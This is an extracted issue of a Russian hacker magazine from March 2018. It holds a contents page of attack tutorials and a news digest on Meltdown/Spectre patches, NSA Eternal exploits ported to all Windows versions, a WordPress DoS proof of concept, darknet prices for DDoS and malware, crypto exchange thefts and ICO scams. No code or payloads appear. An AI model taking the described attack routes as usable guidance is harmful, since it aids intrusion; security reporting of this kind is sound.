

                                                  Март 2018
            № 228
CONTENTS

   MEGANEWS
  Всё новое за последний месяц

    Дайджест Android
  Лучшие гайды, библиотеки и инструменты месяца

     Атлас мира криптовалют
  Разбираемся с ICO и ориентируемся в новых крип топроектах

    Как крадут день ги при ICO
  Разбираем типовые сценарии похищения средств и самих ICO

    Критичный процесс
  Учимся создавать и принудительно завершать критичные процессы в Windows

    Одна «Альфа» хорошо, а две — лучше!
  Готовимся к продвинутым техникам взлома Wi‐Fi

    Кавычкой по «Джумле»
  Учимся проводить SQL‐инъекцию второго порядка на примере уязвимости в Joomla

    Грандиозный факап
  Разбираем уязвимости проверки сертификатов SSL/TLS в неб раузерном софте

     ][‐детектив: целевая атака на Сбербанк
  Раскрываем подробности АРТ «Зловредный Сан та‐Клаус»

     Гасим файрвол
  Учимся эксплу атировать критическую уязвимость в ОС Palo Alto Networks

    Прятки по хардкору
  Как сделать свой драйвер режима ядра Windows и скрывать процессы

    Как подчинить белку
  Учимся эксплу атировать новую уязвимость в почтовике SquirrelMail

    Инъекция для андроида
  Внедряем код в чужие приложения с помощью Frida

    Новое поколение джейлбрейка
  Как взломать iOS 11, чем это грозит и как работает новый метод взлома

    Новая броня Android
  Как Android 9 будет защищать приватность и безопасность пользователей

     Android для юник соида
  Используем смартфон в связке с Linux

    Защищаем ноут бук с Linux
 Шифрование, аутен тификация по флешке и возврат украден ного

   WWW
  Интересные веб‐сервисы

    Детект песочницы
  Учимся определять, работает ли приложение в sandbox‐изоляции

     Mining Pool на Java
  Кодим распределен ный биткойн‐майнер

    Прыжок в облако
  Строим бюджетное решение для интернета вещей на NodeMCU + Azure IoT Hub

    Задачи на собеседованиях
  От хакеров — хакерам: задачи от HackerU

    Надзирай и властвуй
  Как узнать все, что происходит с твоей Linux‐машиной

    PICO‐8
  Играем и кодим на легендарной приставке, которой никогда не было

                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





ВРЕМЯ ПАТЧИТЬ
КАМНИ
Продолжается работа над исправлением глобаль ных уязвимостей Meltdown
и Spectre, которым подвержены практически все современные и не слишком
процессоры и, следовательно, устройства.
  Напомню, что суммарно в «набор» Meltdown и Spectre входят три CVE:
CVE‐2017‐5754 (Meltdown), CVE‐2017‐5753 (Spectre, Variant 1) и CVE‐2017‐5715
(Spectre, Variant 2). Если Meltdown и Spectre, Variant 1, в теории можно испра‐
вить на уровне ОС, то полное исправление Variant 2 требует также обновле‐
ния прошив ки/BIOS/микрокода, из‐за чего у про изво дителей возникли мно‐
гочисленные нак ладки.
  Данные о Meltdown и Spectre рас кры ли раньше запланированного срока.
Официально опубликовать информацию о проблемах собирались в середине
января 2018 года (обычное эмбарго длиной в 90 дней на этот раз было
существенно уве личено в силу «комплексной природы уяз вимос тей и исправ‐
лений для них»). Однако утечка данных в СМИ произошла раньше, и в резуль‐
тате начало 2018 года ознаменовалось нас тоящей паникой среди спе‐
циалистов по информационной безопасности, когда слухов было куда боль‐
ше, чем фактов.
  В результате почти все патчи для найденных проб лем были подготовлены
в спешке. Исправления ока зались несовместимы с некоторыми антивирус‐
ными решениями, вызывали отказ в работе систем, провоцировали BSOD
и частые перезагрузки, а также заметно снижали производительность. В ито‐
ге в конце января 2018 года компания Intel экс тренно приостановила рас‐
пространение исправлений для уяз вимос ти Spectre (Variant 2), призвав поль‐
зователей и про изводителей железа дождать ся нормально работающих вер‐
сий микрокодов.
  За прошедшее с тех пор время инженеры Intel успели подготовить новые
микрокоды для процессоров на архитектуре Skylake, а также патчи для Kaby
Lake и Coﬀee Lake. Обновления предназна чены для шестого, седьмого
и восьмого поколений продуктовой линейки Intel Core, а также процес соров
Intel Core X, Intel Xeon Scalable и Intel Xeon D (последние два решения исполь‐
зуются в основном в дата‐центрах).
  Затем разработчики Intel предста вили еще одно обновле ние документа
Microcode Update Guidance, согласно которому новые микрокоды готовы
для нескольких моделей процессоров Haswell и Broadwell. Так, исправления
получат решения Broadwell с CPUID 50662, 50663, 50664, 40671, 406F1,
306D4 и 40671, а также ряд процес соров Haswell — 306C3, 4066, 306F2,
40651 и 306C3. Фактически перечисленные CPUID относятся к процессорам
серий Xeon и Core.
   Стоит отме тить, что это далеко не последние патчи, которые придется
выпустить Intel. Сво его часа ждут еще 16 типов процессоров, в том числе
чипы Sandy Bridge и Ivy Bridge. Точного графика выхода исправлений для них
пока нет, известно лишь, что микрокоды находят ся в разработке, на стадиях
Pre‐beta и Beta.
  Сложившаяся вокруг выхода пат чей ситуация возмутила не только поль‐
зователей. В конце января 2018 года члены Комитета сената США по энер‐
гетике и торговле направили официальные запросы компаниям Intel, AMD,
ARM, Apple, Amazon, Google и Microsoft, силясь разобраться в хаосе, который
окружал рас крытие информа ции об уязвимос тях Spectre и Meltdown, и в при‐
чинах многочисленных накладок, возникших при выпуске исправлений.
   Учитывая серьезность ситуации, члены Комитета сената США по энер‐
гетике и торговле призвали компании к ответу, требуя официальных разъ‐
яснений. Производители ответили на этот запрос еще в начале фев‐
раля 2018 года, однако их пись ма были обна родованы лишь сей час.
  Наиболее информативным и интересным определенно стал ответ ком‐
пании Intel. В частности, представители «желез ного» гиганта пролили свет
на весьма любопытный нюанс:



      «До утеч ки информа ции [в СМИ] Intel рас кры вала данные о Spectre
      и Meltdown лишь тем ком паниям, которые могли помочь Intel улуч шить
      безопас ность пользовате лей озна ченной технологии», — гла сит пись-
     мо Intel.

Фактически это означает, что руководс тво Intel сочло бесполезной помощь
властей и сторонних специалис тов, не поставив в известность о Spectre
и Meltdown никого, кроме узкого кру га лиц. Лишь преждевременная утечка
информации в прессу вынудила компанию «ускорить свои планы по выпуску
исправлений» и уведомить о проблемах US‐CERT, CERT/CC и широкую
общественность.
   Также чле нов сената вполне оправданно волновал вопрос влияния Spectre
и Meltdown на критичес кие объекты инфраструктуры, особенно в свете того,
что исследователи и производители дол гое время скры вали критические уяз‐
вимости от властей. На это предста вители Intel ответили, что, согласно их
данным, риск для промышленных систем управления весьма низок. В целом
же Intel, равно как и предста вители других компаний, оправдывают «замал‐
чивание» проблем Spectre и Meltdown очень прос то и сообщают, что
наложенное на информа цию эмбарго соот ветс твовало всем принятым
в индустрии стандартным процеду рам. Якобы это должно было защитить
общественность от эксплуатации еще не закрытых «дырок».
  Интересные факты можно встретить также и в официальных ответах других
компаний. К примеру, Microsoft признала: инженеры компании заранее знали
о том, что патчи для уязвимос тей будут конфликтовать с некоторыми анти‐
вирусными продуктами. Компания даже пыталась предупредить производите‐
лей защитных решений, одна ко сделать это оказалось крайне сложно, так
как нельзя было раньше времени сообщить о Meltdown и Spectre всему миру.


37% РОССИЙ СКИХ ПОЛЬЗОВАТЕ ЛЕЙ ВСЕ ЕЩЕ ЗАПИСЫ‐
ВАЮТ ПАРОЛИ
→Эксперты «Лаборатории Касперского» под считали, что уровень цифровой грамотности поль‐
зователей повышается.

В частности, люди стали внимательнее в отношении своих паролей. Но сложные и разные
пароли трудны для запоминания, и половина пользователей так или иначе выбирает небезо‐
пасный способ хранения паролей, которые не может запом нить.

28% записывают комбинации символов в блокнот, а 9% — на лис ток бумаги, лежащий рядом
с компьютером. 11% доверяют пароли браузерам, а 8% сохраняют их в отдельном файле
на компьютере.

Специальное ПО для безопасного хранения паролей сегодня в Рос сии выбирают менее 6%
пользователей.





ЭКСПЛОИТЫ АНБ
ДЛЯ ВСЕХ ВЕРСИЙ
WINDOWS
Весной 2017 года хакерская группа The Shadow Brokers опубликовала
в открытом доступе «арсенал кибероружия», похищенный у американских
спецслужб. Тогда хакеры обнародовали экс плоиты и инструменты, украден‐
ные у Equation Group — груп пировки, за которой стоят «правительственные
хакеры» из АНБ. В результате дос тоянием широкой общественности стали
такие опасные вещи, как экспло ит EternalBlue, направленный на эксплуата‐
цию уязвимости в протоколе SMB (именно он использовался для распростра‐
нения шифровальщика WannaCry в мае 2017 года, а затем во время атак Not‐
Petya и Bad Rabbit).
  Еще летом 2017 года специалис ты компании RiskSense Шон Дил лон (Sean
Dillon) и Дилан Девис (Dylan Davis) сооб щили, что им удалось адаптировать
эксплоит EternalBlue для работы с Windows 10. Напомню, что на тот момент
инструмент для исполь зования багов в SMB уже мог применяться для атак
на Windows XP, Windows Vista, Windows 7, Windows Server 2003 и Windows Serv‐
er 2008, хотя в некото рых случаях добиться заражения было весьма непросто.
Также исследователям уда лось модифицировать EternalBlue для работы
с Windows 8, Windows 8.1 и Windows Server 2012.
  Однако в опубликованном The Shadow Brokers дампе содержались и дру‐
гие эксплоиты, чьи названия не столь извес тны, но потенциал тоже обширен.
Все прошедшие месяцы Шон Диллон продолжал начатую в 2017 году работу
и теперь сообщил об очередном успехе. Исследователю удалось скорректи‐
ровать исходный код экспло итов EternalChampion, EternalRomance и Eternal‐
Synergy таким образом, что теперь эти инстру менты могут использоваться
против любых версий Windows, 32‐раз рядных и 64‐разрядных, вышедших
за последние 18 лет (начиная с Windows 2000).
  Диллон уже адаптировал результат своей работы для Metasploit и опуб‐
ликовал исходные коды на GitHub. Так, CVE‐2017‐0146 (EternalChampion, Eter‐
nalSynergy) позволя ет спровоцировать состояние гонки через transaction‐
запросы, а CVE‐2017‐0143 (EternalRomance, EternalSynergy) эксплуатирует
проблему типа type confusion между WriteAndX и transaction‐запросами.
  Эксперт подчеркивает, что данные инстру менты были созданы исклю‐
чительно в рамках научного исследования и предназначены для специалис‐
тов и разработки эффективных защитных практик. Использование этих экс‐
плоитов для атак без явного согласия третьей стороны противозаконно,
и автор не несет никакой ответственности за подоб ные инциденты.





→«Криптовалюты по‐прежнему являются новым, гиперволатильным классом активов и в любой
момент могут обрушиться почти до нуля. Не вкладывайте в эту сфе ру больше средств, чем
готовы потерять. Если вы пытаетесь решить, как лучше хранить свои накопления, традици‐
онные активы — это беспроигрышный вариант»
— Виталик Бутерин предостерегает криптовалютных инвесторов в сво ем Twitter





БИРЖА BITGRAIL
ОБАНКРОТИЛАСЬ
ПОСЛЕ ВЗЛОМА
Итальянская криптовалютная биржа BitGrail пострадала от рук неизвестных
злоумышленников. С кошелька ресурса похитили более 17 миллионов монет
Nano (XRB, ранее проект носил имя RaiBlocks), что эквивалентно пример‐
но 180 миллионам дол ларов на момент публикации официального заявления
об инциденте. После официального заявления Nano значительно потеряла
в цене, и теперь сумма ущер ба сос тавляет примерно 145 миллионов.
  Интересно, что в официальном заявлении, опуб ликованном компанией,
отсутствуют слова «взлом» или «ата ка». Речь идет о многочисленных «неав‐
торизованных транзакциях», которые выяви ла внут ренняя проверка. Сооб‐
щается, что в результате загадочного инцидента пострадала только крип‐
товалюта Nano, которую похитили из кошелька биржи. При этом ресурс вре‐
менно приостановил все операции для всех криптовалют вообще, то есть
ввести или вывести средс тва пока невозможно. К рассле дованию произо‐
шедшего уже подключились пра воохранительные органы.
  Основатель и владелец биржи Франческо Фирано (Francesco Firano), так‐
же известный как The Bomber, со общил в своем Twitter, что компания не суме‐
ет возместить похищенные средс тва всем пос тра давшим, так как в нас‐
тоящее время в распоряжении BitGrail оста лось лишь 4 мил лиона Nano, чья
стоимость составляет пример но 40 миллионов долларов. Также Фирано
отметил, что разработчики Nano не желают сотрудни чать с BitGrail.
  В ответ на это команда раз работки Nano пос пешила опубликовать свою
версию случив шегося в официальном блоге про екта. Дело в том, что Фирано
также заявил, будто причиной инцидента мог стать некий баг в протоколе
Nano. Разработчики отвергли эту теорию и заверили, что Nano в пол ном
порядке, а проблему следует искать в ПО BitGrail.
   Хуже того, разработчики предполага ют, что Фирано и представители Bit‐
Grail знали о произошедшем давно, средс тва были похищены отнюдь не на
прошлой неделе, а поль зователей и команду Nano Core дезинформировали
намеренно. Стоит отметить, что биржа приостановила операции с крип‐
товалютой Nano еще в январе 2017 года, предложив пользователям кон‐
вертировать Nano в Bitcoin. Затем пользователей биржи попросили пройти
верификацию, что тоже никак не помогло с выводом средств.
  В своем блоге команда Nano обна родовала переписку, в которой Фирано
предлагал использовать для решения возникшей проблемы хардфорк. Пос ле
этого разработчики и вовсе опубликова ли деталь ный раз бор одной из «неав‐
торизованных транзакций» и сообщили, что это представители BitGrail отка‐
зываются с ними сотрудничать, из‐за чего расследование продвигается мед‐
ленно.
  Судя по нас троениям в Сети, большинс тво поль зовате лей поддерживают
разработчиков Nano, тогда как BitGrail обви няют в мошенничес тве, халат‐
ности и даже в краже средств и exit scam. Кро ме того, пользователи уже объ‐
единились для подачи коллективного судебного иска.


DDOS‐АТАКУ НА ЧАС МОЖНО ЗАКАЗАТЬ ВСЕГО
ЗА 10 ДОЛЛАРОВ
→Аналитики ком пании Armor изучили положе ние дел на круп ных торговых площадках в даркне‐
те и подсчитали, сколько сейчас стоят популяр ные в кибер преступной среде услу ги и сервисы.

DDoS‐атака обойдется заказчику в 10 долларов за один час или 200 долларов за один день.
Атака длительностью неделю и более стоит 500–1200 дол ларов.

Аренда банкингового ботнета будет стоить 750 дол ларов в месяц (с базовой функциональ‐
ностью) или 1200 долларов в месяц (с полной функциональностью). За офи циальную поддер‐
жку придется отдать еще 150 долларов.

Наборы эксплоитов по‐преж нему остаются дорогим удовольствием: аренда решения Disdain
обойдется в 1400 долларов в месяц, тог да как более серьезный набор Stegano стоит 15 000
долларов в месяц.

Скиммер для установки на банкомат можно приобрести в даркнете за 700–1500 долларов.

Стоимость малвари для взлома конкретных прог рамм, ОС и решений сильно варьиру ется:
от 50 долларов за инструмент для хищения паролей или 100 долларов за эксплоит для Word‐
Press до 1500 за лоудер для Android или 650–1000 дол ларов за билдер экс пло итов для Mi‐
crosoft Ofﬁce.


В продаже можно найти даже различные хакерские мануалы и туториалы, стоимость которых
колеблется от 5 до 50 долларов.





СПЕЦСЛУЖБЫ США
ПРОТИВ HUAWEI И
ZTE
На прошедшем заседании Специального комитета по разведке сената кон‐
гресса США прозвучало весь ма интерес ное заявление. Главы сразу шести
американских ведомств, включая ФБР, АНБ и ЦРУ и Наци ональную разведку,
заявили, что простым американским гражданам не стоит пользоваться
устройствами компаний Huawei и ZTE из‐за опасности шпионажа.
  Директор ФБР Кристофер Рэй (Chris Wray) сообщил, что правительство
«глубоко обеспокоено» рисками, которые могут воз никнуть, если позволить
зарубежной компании или организа ции, которая отчи тывается правительству
своей страны и не разделяет американских ценностей, занять домини‐
рующие позиции в телекоммуникационных сетях США. Также Рэй говорил
о том, что все это чревато вредоносными модификациями и хищением дан‐
ных, кроме того, компания или организация в таком положении получает
прекрасную возможность для скрытого шпионажа.
  В своем заявлении главы спецслужб осо бо выделили компании Huawei
и ZTE, которые, по их мнению, тес но свя заны со спецслужбами КНР.
   Стоит отметить, что совсем недавно компания Huawei дей ствительно
готовилась к выходу на американский рынок и, в частности, планировала зак‐
лючить партнерство с телекоммуникационным оператором AT&T, однако
в январе 2018 года сделка сорвалась. И, как утверждают СМИ, во многом
это произошло имен но из‐за давления со стороны властей США.
  Представите ли Huawei и ZTE уже выразили недоуме ние относительно
позиции глав американских спецслужб. Так, в Huawei заявили, что продукции
компании доверяют правительства и пользователи 170 стран мира и Huawei
таит в себе ровно такую угрозу кибербезопасности, как и любой другой про‐
изводитель в области информационно‐коммуникационных технологий. «Мы
предельно открыты и прозрачны во всем, что дела ем», — подчеркнули пред‐
ставители компании.
  Компания ZTE, в свою очередь, сообщила, что с гордостью представляет
свои инновационные решения на американском рынке и всегда тщательно
соблюдает все законы и администра тивные пра вила США. Также в компании
отметили, что большинство продуктов ZTE пос троено на основе произведен‐
ных в США чипсетов, операционных систем и других компонентов.


700 000 ВРЕДОНОСНЫХ ПРИЛОЖЕНИЙ УДАЛИЛИ
ИЗ GOOGLE PLAY В 2017 ГОДУ
→Компания Google под вела итоги 2017 года.

Аналитики Google рассказали, что в большинс тве случаев проникшая в Play Store малварь ими‐
тирует другие популярные приложе ния. Часто злоумышленники используют Unicode и гомог‐
рафические атаки, чтобы выдать фейковое приложение за извес тный ори гинал, подделав даже
название.

За год из официального каталога приложений было удалено более 700 000 вредонос ных при‐
ложений и заблокировано более 100 000 недобросовес тных разработчиков. Эти показатели
почти на 70% превышают результаты 2016 года.

Суммарно из официального каталога приложений исключили более 250 000 при ложе ний‐ими‐
таторов.





15 000 000 НЕБЕСНЫХ
ТОРРЕНТОВ
Популярный «пиратский» торрент‐трекер SkyTorrents стал жертвой собствен‐
ного успе ха и был вынужден объявить о закрытии.
   SkyTorrents был создан около года тому назад, и тогда опе раторы сервиса
сразу заявили, что на их сайте не будет никакой рекламы. Хотя многие
отнеслись к этому заявлению со скепсисом, трекер быстро набрал популяр‐
ность, и вокруг него соб ралась немалая пользователь ская база.



      «Сайт оста нется свобод ным от рек ламы или будет зак рыт. Когда наши
      собс твенные средс тва иссякнут, мы перейдем к сбору пожер твований.
      Так же мы можем передать ресурс кому‑либо еще, кто име ет ана-
      логич ные намере ния, раз деляет наши инте ресы и цели по  дос-
     тижению свобод ного от рек ламы „пиратского“ мира», — писали опе-
      раторы SkyTorrents год назад.

К сожалению, события развивались по сценарию, который предполагали
организаторы ресурса. SkyTorrents очень быстро дошел до стадии, когда сайт
начал генерировать несколько миллионов посещений в день, трафик рез ко
вырос, а вместе с ним увеличились и расходы на содержание ресурса. Так,
ежемесячные траты воз росли до 1500 долларов, и, хотя администраторы Sky‐
Torrents попытались собирать пожертвования, это не слишком помогло.
  В итоге даже сами поль зователи стали уговаривать опе раторов трекера
монетизировать ресурс пос редством рекламы, так как пара рекламных бан‐
неров — ничто по сравнению с перспективой закрытия сайта. Увы, админис‐
трация SkyTorrents твердо стояла на своем, в том числе из‐за того, что рек‐
лама компрометирует приватность пользователей.
   Так как деньги у команды в ито ге закончились, SkyTorrents все же прек‐
ратил работу, как и было обещано год назад. Одна ко трекер не просто ушел
в офлайн. После себя операторы ресурса оста вили гигантскую базу, нас‐
читывающую около 15 миллионов торрентов. Любой желающий может заг‐
рузить 444 Гбайт torrent‐файлов или ска чать только хеши, которые «весят»
322 Мбайт.
  Команда SkyTorrents надеется, что кто‐нибудь, воспользовавшись базой
ресурса, возродит трекер, продолжив развивать идею свободного от рек‐
ламы «пиратского» пространс тва. Впрочем, как показала практика, быть рату‐
ющим за свободу информа ции альтруистом — весь ма накладное хобби.





→«Главная особенность крип товалют — их анонимность. И я не думаю, что это хорошо.
Хорошо, когда у правительств есть возможность отслеживать отмывание денежных средств,
уклонение от уплаты налогов, а также спонсирование террорис тов. В нас тоящее время крип‐
товалюты используются для покупки фентанила и других нар котиков, так что это редкая тех‐
нология, которая почти нап рямую приводит к смерти людей. Также я считаю, что вол на спе‐
куляций вокруг различных ICO и криптовалют создает огромные риски в долгосрочной перспек‐
тиве»
— Билл Гейтс отвечает на воп рос пользовате ля Reddit о криптовалютах в ходе сессии AMA
(Ask me anything, «Спросите меня о чем угодно»)





                                     Продолжение статьи →
← Начало статьи
 ANDROID P ПРОТИВ
 ПОДГЛЯДЫВАНИЯ
  Издание XDA‐Developers сообщило, что в новой версии опе рационной сис‐
  темы Android, которая пока известна под кодовым наз ванием Android  P,
   появятся важные изменения, связанные с безопас ностью.
      Так, в Android Open Source Project (AOSP) были обнаружены два коммита,
  которые призваны ограничивать работа ющие в фоновом режиме приложе‐
   ния, не позволяя им получать дос туп к микрофону или камере устрой ства пос‐
  ле длительного простоя. Разработ чики пишут, что данные меры должны улуч‐
  шить защиту лич ных данных пользователей. Ведь, разрешая приложению
  доступ к камере и микрофону, человек зачастую даже не подозревает о том,
   что впоследствии приложение может использовать эту функциональность
  за его спиной, по собственной инициативе.
     Стоит сказать, что подобные огра ничения напрашивались давно, так
   как вирусописатели уже не один год экс плуатируют микрофоны и камеры
  мобильных гаджетов для скрытой слежки за их вла дельцами.
    Ожидается,   что   Android  P  станет  доступна  для  тестирования
   в мае 2018 года, то есть первые билды новой версии ОС дол жны увидеть свет
  одновременно с проведением конференции Google I/O. Официальный релиз
  новой  версии  Android  зап ланирован  ориентировочно  на  август‐сен‐
  тябрь 2018 года.


 ЕЖЕГОДНЫЙ ОПРОС ПОЛЬЗОВАТЕ ЛЕЙ STACK OVERFLOW
 ВЫЯВИЛ ТЕКУЩИЕ ТРЕНДЫ
  →Каждый год предста вители Stack Overﬂow проводят опрос своей немалой пользовательской
   базы, чтобы выявить наиболее актуальные тренды текущего года среди раз работчиков.

   На этот раз в опросе приняли участие 101 592 пользователя, которым предложили ответить
   на сто с лишним разнообразных вопросов. Ниже мы приводим основные результаты.





       Самый распространенный язык программирования / разметки / описания сценариев





                           Самые популяр ные фреймвор ки





                           Самые популяр ные базы дан ных





                  Самый любимый сообщес твом язык прог раммирования





                Самый ненавистный язык программирования для сообщества





                   Язык, выучить который опрошенные хотели бы больше все го





     Сводная карта, иллюстрирующая все группы умений и знаний опро шен ных, а также связи
                          между различными технологиями





 WORDPRESS:
 ФИНАЛЬНОЕ
 ОБНОВЛЕНИЕ
  5 февраля 2018 года раз работчики WordPress опубликовали новую версию
  CMS (WordPress 4.9.3), которая должна была устранить ряд мелких проблем,
  но в итоге случайно испортила механизм автоматических обновле ний, поз‐
  воляющий CMS обновляться самос тоятельно, без участия пользователя.
     Хотя ошибку быстро заметили и уже на следующий день вышла версия
  WordPress 4.9.4, восста навливающая нормальную работу системы автомати‐
  ческих обновлений, возникла очевидная проблема. Дело в том, что поль‐
  зователи, у которых система обновлений уже сломалась, не получили авто‐
  матического исправления в виде WordPress 4.9.4, они могут даже не знать
  о его существовании. Для установки версии 4.9.4 пострадавшим нужно ини‐
  циировать обновле ние вручную, из панели управления.
    Еще одна скверная новость в том, что в обеих версиях (4.9.3 и 4.9.4)
   отсутствовал патч для проб лемы CVE‐2018‐6389, о которой ранее сообщил
  независимый израильский ИБ‐специалист Барак Тавили (Barak Tawily). Эта
  критическая DoS‐уязвимость свя зана с работой load‐scripts.php. По сути, баг
  позволяет «уронить» практически любой уяз вимый сайт, направляя ему спе‐
  циально сформированные запросы.





  Тавили обнаружил, что ата кующий может заставить load‐scripts.php загрузить
  все доступные файлы JavaScript вообще, прос то перечислив их в URL. Из‐за
   этого атакуемый сайт может начать работать зна чительно медленнее, пог‐
  лощая все больше и больше мощностей сервера. Разумеется, при помощи
  одного такого запроса зло умышленни ку не удастся спровоцировать отказ
   в обслужива нии, однако исследова тель создал proof‐of‐concept эксплоит —
  простой скрипт doser.py, написанный на Python. Скрипт отправляет множес‐
   тво подобных запросов целево му URL. Примерно после 500‐го запроса
  средний сайт, работающий на VPS‐сервере, перестает отве чать вовсе,
   «отдавая» лишь ошибки 502, 503 и 504.
    Специалист предупредил, что с одного компь юте ра вряд ли удас тся
  «положить» работающий под управлением WordPress сайт, расположенный
  на отдельном мощ ном сервере, одна ко, если в распоряжении атакующе го
   есть широкий канал или несколько ботов, ата ка сработает даже против такого
  ресурса, причем окажется менее зат ратной для злоумышленника, нежели
  обычный DDoS.
     Хотя Тавили давно уведомил о проблеме раз работчиков CMS, те не сочли
  обнаруженную уязвимость достаточно серьезной и сообщили, что решать
   такие проблемы нужно на уровне сервера или сети, но не на уровне приложе‐
   ний. Судя по отсутствию патчей в сос таве версий 4.9.3 и 4.9.4, решение раз‐
  работчиков до сих пор не изменилось.
     К сожалению, proof‐of‐concept экс пло ит для CVE‐2018‐6389 уже свободно
  доступен в Сети. Более того, специалисты компании Imperva подготовили
  собственный доклад, где полностью согласились с выводами Барака Тавили
  и сообщили, что сайты под управлением WordPress уже подвергаются атакам,
  которые эксплуатируют данный баг.
     Отчаявшись дождаться патчей, Тавили опубликовал на GitHub собс твен‐
  ный форк WordPress, в котором уяз вимость устранена. Также исследователь
  выложил в открытый доступ bash‐скрипт, который поз воляет исправить проб‐
  лему в уже существующих установках CMS.


 ЛИШЬ 19,1% ПОЛЬЗОВАТЕЛЕЙ ЗАПЛАТИЛИ ВЫКУП
 ШИФРОВАЛЬЩИКАМ И СПАС ЛИ СВОИ ДАННЫЕ
  →Интересный аналитический отчет опубликовали специалисты CyberEdge Group.

   Компания CyberEdge Group опросила представителей более 1200 ИТ‑фирм и руково дителей
   в 17 странах мира, чтобы понять, как эффективнее пос тупать в случае, если вы стали жертвой
  шифровальщика.

   Оказалось, что от атак вымогателей пострадали более 55% опрошен ных и 61,3% из них отка‐
   зались платить злоумышленникам выкуп. Восстановить файлы своими силами в итоге удалось
  53,3% отказавшихся.

   Заплатить преступни кам решили 38,7% компаний, но только чуть меньше полови ны из них
     (19,1%) в итоге получили от операторов малвари инструменты для расшифров ки данных.
   Оставшиеся 19,6% лишились одновремен но и денег, и информации.





 ПЕНИС ВМЕСТО ICO
  Криптовалютный стартап LoopX, обещавший поль зователям раз работать
  мобильное приложение для торговли криптовалю той на базе собственного
  уникального проприетарного алго ритма, оказал ся фальшивкой. Разработ‐
   чики LoopX исчезли в неизвестном нап равлении, а все аккаунты проекта
   в социальных сетях, включая Facebook, Telegram и YouTube, были удалены.
  Согласно архивной версии официального сайта, проект сулил инвесторам
   крупную прибыль, которая должна была только возрастать каждый месяц.
     Пользователи Reddit предупреждали, что проект выглядит крайне подоз‐
  рительно. Как выяснилось, о команде разработчиков и самом «проприетар‐
  ном алгоритме» не было извес тно практически ничего, и ICO могло оказаться
  простым мошенничеством. Но, к сожалению, немногие прислушались к этому
  предупреждению.
     ICO проекта стартовало еще в январе 2018 года, но команда LoopX
   исчезла, собрав со своих инвесто ров 276,21 Bitcoin (BTC) и 2446,70 Ethereum
   (ETH). То есть на продаже токенов LoopX Coin (LPX) мошенники заработали
  около 4,5 миллиона дол ларов.
    Особенно иронично, что за неделю до инцидента всем пользователям
  были разосланы элек тронные пись ма, в которых разработчики в скором вре‐
  мени обещали инвесторам некий «сюр приз».





  Судя по сообщениям пользователей, опубликованным на Reddit, и обсужде‐
  нию случившегося на форуме BitcoinTalk, некоторые пострадавшие уже обра‐
  тились в правоох ранительные орга ны, а также пользователи собираются
  подать в суд коллектив ный иск.
     Увы, это далеко не первое ICO, завершившееся столь плачевным обра‐
   зом. К примеру, недавно такой же фальшивкой ока зался литовский стартап
  Prodeum, ICO которого стартовало 20 января 2018 года и должно было длить‐
  ся до середины марта. Данный проект соб рал нес колько сотен дол ларов
  вместо запланированных шес ти миллионов и тоже исчез (впрочем, по дан‐
  ным ICOWatchlist, мошенники все же были более успешны и похитили око‐
  ло 500 тысяч долларов). В ито ге там, где еще недавно раз мещал ся сайт «пер‐
  спективного блокчейн‐про екта»,  осталась лишь  пустая белая  страница
  с одним‐единственным сло вом: penis.





  →«У меня было семь биткойнов, но их похитили мошен ники. Некто купил их у меня в онлайне,
   расплатившись кредитной кар той, а затем просто отменил платеж. Вот так просто! Они исполь‐
   зовали номер ворованной кре дитной карты, так что вернуть средства невозможно»
  — Стив Возняк расска зал в интервью The Economic Times, как он не стал криптомиллиардером





 ЗАГРУЗЧИК IPHONE
 СЛИЛИ НА GITHUB
  Некий аноним опубликовал на GitHub исходные коды загрузчика iBoot, одной
  из ключевых составляющих устройств Apple, которая отвечает за процесс
  доверенной загрузки ОС. Фактически имен но iBoot стартует одним из первых
  после вклю чения устройства (рань ше стартует только Boot ROM), он находит
  и верифицирует ядро, проверяя, имеет ли оно необходимые подписи Apple,
  а затем передает ему управление или переключа ет девайс в режим восста‐
  новления.
     Так как происхождение данных исходных кодов — загад ка, сначала
  о легитимности iBoot говорили с осторожностью. Сам анонимный источник
   утверждал, что исходники отно сят ся к релизу iOS 9.3.x, но отмечал, что боль‐
  шая часть кода, скорее всего, используется и в iOS 11. Неизвестный писал,
   что скомпилировать код не выйдет из‐за недос тающих файлов, но предложил
  ИБ‐специалистам и энтузиастам изу чить iBoot на предмет уяз вимос тей.
  Впрочем, наиболее свежие iOS‐устройства должен допол нительно защищать
  Secure Enclave.
     Стоит сказать, что компания Apple в целом публику ет исходные коды своих
  продуктов с большой неохо той, а исходный код iBoot тем более является зак‐
  рытым и тщательно оберега ется. Так, даже самая крупная выплата по офи‐
  циальной, закрытой bug bounty программе Apple (200 тысяч дол ларов) пре‐
  дусмотрена имен но за обнаружение уяз вимос тей в процессе начальной заг‐
   рузки.
    В итоге спустя всего день репозиторий с исходны ми кодами iBoot был
  удален с GitHub по требова нию Apple. Предста вители компании оперативно
  подали жалобу о нарушении DMCA (Digital Millennium Copyright Act, «Закон
  об авторском праве в цифровую эпоху»), после чего администрация GitHub
  поспешила удалить спорный контент. Интерес но, что таким образом предста‐
   вители Apple косвенно подтвердили легитимность данной утечки.
  Затем  представите ли  Apple официально прокомментировали  ситу ацию
  и поспешили успокоить пользователей:



         «Судя по все му, утеч ка затронула ста рые исходные коды трехлетней
         дав ности, но струк тура безопас ности наших продук тов такова, что она
        не полагается на сек ретность исходного кода. В наших решениях
        реализова но множес тво аппа ратных и програм мных слоев безопас-
         ности, и мы всегда призыва ем наших пользовате лей обновлять ПО до
        новейших вер сий и использовать пре иму щес тва самых акту альных
         средств защиты».


  50 000 000 АКТИВНЫХ СЕРТИФИКАТОВ УЖЕ ВЫДАЛ
  LET’S ENCRYPT
  →Операторы неком мерческого удостоверяющего центра Let’s Encrypt похвастались новым
   достижением.

   Бесплатные сертификаты, получить которые может любой желающий, были выданы уже более
  50 миллионов раз и теперь охватывают порядка 66 миллионов доменов.

   Согласно статистике NetTrack, в настоящее время сертификаты Let’s Encrypt используются
   на 42,6% всех HTTPS‐сайтов в интернете. Стоит отме тить, что еще три месяца назад этот
   показатель составлял 36%.

   По данным сервиса Firefox Telemetry, общая доля зап росов страниц по HTTPS в настоящее вре‐
   мя достигает 69,6%.
HEADER

 МОБИЛЬНЫЙ
  ДАЙДЖЕСТ





                                         Евгений Зобнин
                                           Редактор Unixoid и Mobile
                                                     zobnin@glc.ru


     ОТСЛЕЖИВАНИЕ СМАРТФОНА
     БЕЗ GPS, ВЗЛОМ УПАКОВЩИКА
       QIHOO И МОДИФИКАЦИЯ
      ПРИЛОЖЕНИЙ В РАНТАЙМЕ





